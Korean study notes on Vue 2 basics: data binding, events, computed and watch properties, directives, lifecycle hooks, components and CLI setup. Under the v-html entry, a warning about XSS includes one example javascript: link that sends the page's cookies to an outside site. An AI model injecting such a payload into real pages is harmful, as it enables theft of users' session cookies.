vue 최초
    1. vue를 사용 할려면 new 로 객체화 한다 , 설정 객체를 전달 해야 한다
    2. 콘데이너 용기 내의 요소는 일반 html 요소이고, 내부에서 vue 문법을 혼합으로 사용한다
    3. 콘테이너 용기 내의 코드는 [vue 템플릿] 이라 한다
    4. {{내용}} 안에서는 표현식만 가능함 1+1 / a / x===y?true:false / demo(1)
        * if / for 등 사용 불가
    5. 콘테이너 용기 와 vue 는 1: 1 관계 이며 1:n 이거나 n:1 이면 에러 생김
    6. data 에 내용이 변하면 화면이 변함

vue 템플릿 문법 2가지
    1. 삽입 방식
        > 태그 안에 존재 함 {{name}} , 모든 data 의 속성을 참조함
    2. 지령 (명령) 방식
        > v-xxx 방식으로 태그 속성 태그내용 함수 에 사용함
            ex. v-bind:href , :href (간소화)

vue 의 2 가지 데이터 바인딩
    1. 단 방향 바인딩 : v-bind
        > date 의 내용을 화면에 출력 (단방향) , html 태그의 value 속성 없는 태그에서 사용
    2. 양 방향 바인딩 : v-model
        > date 내용을 화면 으로 화면에서 data 로 통함 html 의 value 속성 존재하는 태그에 사용 (input,select..)

data와el 의 2가지 코딩방식
    1. el 의 2가지 코딩 방식
        > new Vue 객체화 할때 el 속성 설정 
        > vue 객체화 한다음 vm.$mount('#root') 방식으로 설정함
    2. data 의 2가지 코딩 방식
        > 오버젝트 방식 
        > 함수 방식 : 반드시 return 이 있어야함
            * 추후에는 반드시 함수방식 사용 , 안 그러면 에러 발생함
    3. 주의 : 화살표 함수 일 때는 window 이고 일반 함수 시 Vue 객체임

MVVM 모델
    1. M = MODEL , vue 의 data 
    2. V = view , 
    3. VM = viewmodel , vue 객체
        > vm 은 모든 data 에 대한 내용과 vue 객체의 속성 까지도 포함되서 바로사용 가능하다
    
vue 의 데이터 대리
    1. 데이터 대리
        > vm 객체로 data 객체의 속성을 읽고/쓴다
    2. 장점
        > 더 편리하게 데이터 컨트롤 한다
    3. 원리
        > Object.defineProperty() 로 data 객체의 모든 속성을 vm 에 넣는다
        > 추가된 속성에는 setter/getter 함수도 함께추가된다
        > setter/getter 함수를 ㅁ통해서 data 의 속성을 변경 한다

이벤트 기본사용
    1. v-on:xxx 혹은 @xxx 로 이벤트 처리함
    2. 함수설정은 methods 객체에 추가함 그러면 최종 vm 에 추가됨
    3. methods 객체에 선언한 함수는 반드시 일반 함수여야 함 화살표 함수면 this 는 window 임
    4. methods 객체에 선언한 하무는 전부 vue 에서 관리 함 그리하여 this 는 vm 혹은 콤퍼넌트 객체임
    5. @click='demo' 혹은 @click='demo($event)' 와 동일함 함수전달 하는 방식 추천
이벤트 확장
    1. prevent  : 기본사용 불가 처리
    2. stop : 퍼블처리
    3. once : 한번만 실행
        * 여러개를 함께 사용 가능 [@click.prevent.stop]
이벤트 키보드
    1. 자주 사용하는 키보드 별칭
        > enter , delete , esc , space , tab , up , down , left , right
            * tab 은 keydown 과 결합해서 사용 해야함
    2. 제공되지 않은 키 처리 
        > 키보드에 1개이상 단어 키 일 경우 소문자 여야 되며 2 단어 사이 - 로 연결
    3. 시스템 키 : ctrl , alt , shift , win(meta)
        > keyup 으로 사용 시 다른 키를 같이 눌럿다가 놓을시 발생
        > keydown 은 정상 발생함
            * 여러개 를 조합 사용 가능 [@click.ctrl.y] = ctrl + y 일 때만 발생함
    4. 키코드 로 지정 (비추)
    5. 자체 별칭 선언 해서 사용 (비추)

계산 속성 (computed)
    1. 정의 
        > 반드시 존재하는 속성에 대해서 연산한다 [data 의 내용]
    2. 원리 
        > Object.defineproperty 의 기반으로 setter / getter 제공한다
    3. get 함수 호출시점
        > 최초 1 회 실행
        > 내부 연동되는 데이터 변화시 실행
    4. 장점
        > methods 방식과 비교 시 내부 캐시에 저장 됨으로 [methods 방식은 캐시 없음 , n번 호출가능] 효율이 좋다
    5. 주의
        > computed 는 vm 에 저장 됨으로 직접 사용 가능하다
        > 만약에 수정 할려면 반드시 setter 함수 선언 해야한다
    6. 간소화 처리
        > 수정이 없이 값만 출력 시 가능 [set 없고 get만 존재시 ] , get함수 생략 하고 변수명을 함수로 처리함
            * fullName:{ get(){ return } } >> fullName(){ return } 
        
감시 속성 (watch)
    1. 감시대상이 변화 했을때 , 콜백함수 가 자동 호출 될때
    2. 감시속성이 반드시 존재해야 한다
    3. 코딩방식
        > new Vue 로 선언시 watch 설정
        > vm.$watch 로도 가능함
깊은 감시 (deep watch)
    1. vue 의 watch 에서 값에 대한 변화는 감시 안함
    2. deep:true 로 설정 해야 트리구조 로 내부 까지 감시함
    3. 주의 :
        > vue 에서는 자제 내부의 값 변경은 감지하나 watch 는 디퐆트로 안함

 computed 와 watch 구분
    1. computed 로 구현 가능한것은 watch 로도 구현 가능
    2. watch 로 구현 가능 한것을 computed 로 구현 불가 한것들이 있음 ex.setTimout 비동기처리
    3. 원칙 : 
        > 모든 vue 가 관리 하는 함수는 일반 함수여야 한다, 그래야 this 로 지정할수 있다
        > vue 가 관리 불가 한 함수들은 화살표 함수로 해야 한다 (setTimeout,ajax,Promise)       

스타일 바인딩
    1. class 방식
        > :class="xxx" 방식으로 사용 , 문자열 , 객체 , 배열 사용가능
            >> 문자열 : 객체명 불 확실하며 동적으로 객체명 확보
            >> 객체 : 여러개 스타일 바인딩 시 사용 개수 불 확실 , 이름 불 확실
            >> 배열 : 여러개 스타일 바인딩 시 사용 개수 확실 , 이름 확실 , 사용여부 불 확실
    2. style 방식
        > :style="{fontSize:xxx}" 동적으로 값 지정
        > :stype="[a,b]" 배열 형식으로 사용가능

조건처리 : v-if / v-else-if / v-else / v-show
    1. v-if , v-else-if , v-else : 
        > 간단한 부분에서 사용 권장함 
        > dom 원소를 삭제 함
        > 중간에 끈으면 안됨
        > templet[공백 태그생성] 와 결합해서 사용 함
    2. v-show
        > 변화가 많을때 사용 권장함
        > dom 원소 를 삭제 안하고 숨김 처리
    
배열처리 : v-for
    1. v-for="(itm,index) in xxx" :key="yyy"
        > 배열, 객체 , 문자열 , 지정회수 를 처리할수 있다

key 관련 질문: 
React, Vue에서의 key의 역할 (key의 내부 원리)
    1. 가상 DOM에서 key의 역할:
        > key는 가상 DOM 객체의 식별자로, 데이터가 변경될 때 Vue는 새로운 데이터 를 기반으로 새로운 가상 DOM 을 생성한다.
        > 이후 Vue는 새로운 가상 DOM과 기존의 가상 DOM을 비교합니다. 비교 규칙은 다음과 같다:
    2. 비교 규칙:
        > 기존 가상 DOM에서 새 가상 DOM과 동일한 key를 찾았을 때:
            - 가상 DOM의 내용이 변하지 않았다면, 이전에 사용했던 실제 DOM을 계속 사용한다.
            - 가상 DOM의 내용이 변경되었다면, 새로운 실제 DOM을 생성한 후 기존의 실제 DOM을 대체한다.
        > 기존 가상 DOM에서 새 가상 DOM과 동일한 key를 찾지 못했을 때:
            - 새로운 실제 DOM을 생성한 후 페이지에 렌더링한다.
    3. index를 key로 사용할 때 발생할 수 있는 문제:
        > 데이터를 역순으로 추가하거나 삭제하는 등의 순서를 파괴하는 작업을 할 경우:
            - 불필요한 실제 DOM 업데이트가 발생하여 효율이 낮아진다.
        > 구조 안에 입력과 같은 DOM이 포함되어 있는 경우:
            - 잘못된 DOM 업데이트가 발생하여 화면에 문제가 생길 수 있다.
    4. 개발 중 key 선택 방법:
        > 각 데이터의 고유 식별자(예: ID, 핸드폰 번호, 주민등록번호, 학번 등)를 key로 사용하는 것이 좋다.
        > 데이터를 역순으로 추가하거나 삭제하는 등의 순서 파괴 작업이 없고 목록을 렌더링하는 용도로만 사용할 경우, index를 key로 사용해도 문제가 없다.

Vue에서 데이터 감시 원리:
    1. Vue는 data 내의 모든 수준의 데이터를 감시.
    2. 객체 내 데이터를 어떻게 감시하나요?
        - setter를 통해 데이터 감시를 구현하며, Vue 인스턴스를 생성할 때 감시할 데이터를 전달해야 한다.
            > 객체에 나중에 추가된 속성은 Vue에서 기본적으로 반응형 처리를 하지 않는다.
            > 나중에 추가된 속성을 반응형으로 만들기 위해서는 다음 API를 사용하:
                Vue.set(target, propertyName/index, value) 또는
                vm.$set(target, propertyName/index, value)
    3. 배열 내 데이터를 어떻게 감시?
        - 배열 업데이트 메소드를 래핑하여 구현하며, 본질적으로 두 가지를 수행:
        > 배열을 업데이트하기 위해 원래의 메소드를 호출.
        > 템플릿을 다시 파싱하여 페이지를 업데이트.
    4. Vue에서 배열의 특정 요소를 수정할 때는 다음 방법을 사용해야 한다:
        > 다음 API를 사용하세요: push(), pop(), shift(), unshift(), splice(), sort(), reverse()
        > Vue.set() 또는 vm.$set()을 사용.
    특별 주의: Vue.set() 및 vm.$set()은 vm 또는 vm의 루트 데이터 객체에 속성을 추가하는 데 사용할 수 없다!

폼 데이터 수집:
    1. `<input type="text"/>`의 경우, v-model은 value 값을 수집하며 사용자 입력이 value 값이 됨.
    2. `<input type="radio"/>`의 경우, v-model은 value 값을 수집하며, 태그에 value 값을 설정해야 한다.
    3. `<input type="checkbox"/>`의 경우:
        > input의 value 속성을 설정하지 않은 경우, 수집되는 값은 checked 상태(체크됨 또는 체크되지 않음, boolean 값)이다.
        > input의 value 속성을 설정한 경우:
            (1) v-model의 초기값이 배열이 아닌 경우, 수집되는 값은 checked 상태(체크됨 또는 체크되지 않음, boolean 값)이다.
            (2) v-model의 초기값이 배열인 경우, 수집되는 값은 value로 구성된 배열이다.
    4. 비고: v-model의 세 가지 수정자:
        > lazy: 포커스를 잃은 후 데이터를 수집
        > number: 입력된 문자열을 유효한 숫자로 변환
        > trim: 입력된 문자열의 앞뒤 공백 제거

filter 필터:
    1. 정의: 표시할 데이터를 특정 형식으로 포맷한 후에 표시함 (간단한 로직 처리에 적합).
    2. 문법:
        > 필터 등록: `Vue.filter(name, callback)`(전역 설정) 또는 `new Vue{filters:{}}`
        > 필터 사용: `{{ xxx | 필터명 }}` 또는 `v-bind:속성="xxx | 필터명"` 적게 쓰임
    3. 비고:
        > 필터는 추가적인 인자를 받을 수 있으며, 여러 필터를 연결할 수도 있음.
        > 원본 데이터를 변경하지 않고, 새로운 데이터를 생성.
    
내부 지령 (지시어) : v-xxx
    1. v-bind   : 단방향 처리 [:xxx 로 간약하게 사용]
    2. v-model  : 양방향 처리
    3. v-for    : 반복문 처리
    4. v-on     : 클릭 이벤트 처리
    5. v-if     : 판단문 처리
    6. v-else   : 판단문
    7. v-show   : 노출 여부 처리
    8. v-text   : 목표에 text 내용 노출 , {{}} 와 달리 전체 치환 
    9. v-html   : html 태그형태로 변환 해서 화면에 노출 
        > v-text 사용법 동일함 , 신중하게 사용 xss 공격에 노출 됨
        > `<a href="javascript:location.href='www.naver.com?'+document.cocik">` 모든 쿠키 정보를 해당 사이트로 이동함
    10. v-cloak : 태그에 임시 속성 추가 , 로딩 완료시 삭제됨 , css 와 결합하여 로딩처리 
    11. v-once  : 최초 동적으로 1회 읽음 , 정적으로 고정됨 
    12. v-pre   : vue 에서 빌드 제외 함 , 즉 동적 데이터 아닐 경우 사용 , 효율 향상됨

자체 지령 (지시어) 요약:
    1. 정의 문법:
        > 지역 지시어:
            new Vue({
                directives: {지시어명: 설정 객체} 또는 {지시어명: 콜백 함수}
            })
        > 전역 지시어:
            Vue.directive(지시어명, 설정 객체) 또는 Vue.directive(지시어명, 콜백 함수)
    2. 설정 객체에서 자주 사용되는 3가지 콜백:
        > bind: 지시어가 요소에 성공적으로 바인딩될 때 호출됨.
        > inserted: 지시어가 있는 요소가 페이지에 삽입될 때 호출됨.
        > update: 지시어가 있는 템플릿 구조가 다시 파싱될 때 호출됨.
    3. 비고:
        > 지시어를 정의할 때는 'v-'를 붙이지 않지만 사용할 때는 'v-'를 추가해야 한다.
        > 지시어 이름이 여러 단어로 구성된 경우 kebab-case[user-name]를 사용해야 하며 camelCase[userName]는 사용하지 않아야 한다.

생명주기:
    1. 다른 이름: 생명주기 콜백 함수, 생명주기 함수, 생명주기 훅.
    2. 정의: Vue가 중요한 시점에 호출하는 몇몇 특별한 이름의 함수들이다.
    3. 생명주기 함수의 이름은 변경할 수 없으며, 함수의 구체적인 내용은 개발자가 요구에 따라 작성한다.
    4. 생명주기 함수 내의 this는 Vue 모델(vm) 또는 컴포넌트 인스턴스 객체를 가리킨다.
    5. 자주 사용하는 생명주기 훅
        > mounted: AJAX 요청을 보내거나, 타이머를 시작하거나, 사용자 정의 이벤트를 바인딩하거나, 메시지를 구독하는 등의 초기화 작업을 수행한다.
        > beforeDestroy: 타이머를 정리하거나, 사용자 정의 이벤트를 해제하거나, 메시지 구독을 취소하는 등의 마무리 작업을 수행한다.
    6. 파괴에 관하여
        > 파괴 후에는 Vue 개발자 도구를 통해 어떠한 정보도 볼 수 없다.
        > 파괴 후에는 사용자 정의 이벤트가 작동하지 않지만, 원래의 DOM 이벤트는 계속 유효하다.
        > 일반적으로 [beforeDestroy]에서 데이터를 조작하지 않는다. 데이터를 조작하더라도 업데이트 프로세스가 다시 트리거되지 않기 때문이다.


Vue에서 컴포넌트를 사용하는 3단계:
    1. 컴포넌트 정의(생성)
    2. 컴포넌트 등록
    3. 컴포넌트 사용(태그 작성)
    > 컴포넌트 정의
        Vue.extend(options)를 사용하여 생성하며, 여기서 options는 new Vue(options)에서 전달되는 options와 거의 비슷하지만 차이점이 있다.
        차이점은 다음과 같다:
            1). el을 작성하지 않는다. 모든 컴포넌트는 최종적으로 하나의 vm에 의해 관리되며, vm의 el이 어떤 컨테이너를 서비스할지 결정하기 때문이다.
            2). data는 반드시 함수로 작성해야 한다. 컴포넌트가 재사용될 때 데이터가 참조 관계에 있는 것을 방지하기 위해서 이다.
        참고: template을 사용하여 컴포넌트 구조를 설정할 수 있습니다.
    > 컴포넌트등록 
        1). 지역 등록: new Vue를 호출할 때 components 옵션을 통해 등록
        2). 글로벌 등록: Vue.component('컴포넌트 이름', 컴포넌트)을 통해 등록
    > 컴포넌트 태그 작성:
        <school></school> 

컴포넌트 명명에 대한 몇 가지 주의 사항:
	1. 컴포넌트 이름에 대해:
		- 단어 하나로 구성된 경우:
			- 첫 글자 소문자: `school`
			- 첫 글자 대문자: `School`
		- 여러 단어로 구성된 경우:
			- 케밥 케이스(kebab-case) 명명: `my-school`
			- 카멜 케이스(CamelCase) 명명: `MySchool` (Vue CLI 지원 필요)
		- 주의 사항:
			- 컴포넌트 이름은 가능한 한 HTML에 이미 존재하는 요소 이름을 피해야 한다. 예를 들어, `h2`, `H2`는 사용하지 말것 
			- name 옵션을 사용하여 개발자 도구에 표시되는 컴포넌트 이름을 지정할 수 있다
	2. 컴포넌트 태그에 대해:
		- 첫 번째 방법: `<school></school>`
		- 두 번째 방법: `<school/>`
		- 주의 사항: Vue CLI를 사용하지 않을 때 `<school/>` 형식은 후속 컴포넌트가 렌더링되지 않도록 할 수 있다.
	3. 간단한 방법:
		- `const school = Vue.extend(options)`를 `const school = options`로 간단히 작성할 수 있다.  

VueComponent에 관한 설명：
	1. school 컴포넌트의 본질은 VueComponent라는 이름의 생성자 함수이며, 이는 프로그래머가 정의한 것이 아니라 Vue.extend로 생성된 것이다 
	2. 우리는 단순히 <school\> 또는 <school></school>이라고 작성하기만 하면 되고, Vue가 해석할 때 school 컴포넌트의 인스턴스 객체를 생성한다. 
        즉,     Vue는 new VueComponent(options)를 실행 한다
	3. 특히 주의할 점은, Vue.extend를 호출할 때마다 항상 새로운 VueComponent가 반환된다
	4. this의 대상에 관하여:
	   (1). 컴포넌트 설정에서:
			data 함수, methods 내부의 함수, watch 내부의 함수, computed 내부의 함수에서의 this는 모두 VueComponent의 인스턴스 객체(vueComponent instance)이다
	   (2). new Vue(options) 설정에서는:
			data 함수, methods 내부의 함수, watch 내부의 함수, computed 내부의 함수에서의 this는 모두 Vue 인스턴스 객체이다
	5. VueComponent의 인스턴스 객체는 이후 vc(또는 컴포넌트 인스턴스 객체)로, Vue의 인스턴스 객체는 이후 vm으로 줄여 부른다 

중요한 내부관계
    1. VueComponent.prototype.__proto__ === Vue.prototype 동일함 
    2. 콤포넌트 원형의 원형으로 Vue 의 원형을 찻아간다

CLI : 
    1 설치 :
        1-1. npm install -g @vue/cli 설치 [node.js 버전20.14]
        1-2. 프로젝트 목록으로 이동 , vue create xxx
            > vue 버전 선택
        1-3. 생성된 프로젝트 로 이동 , npm run serve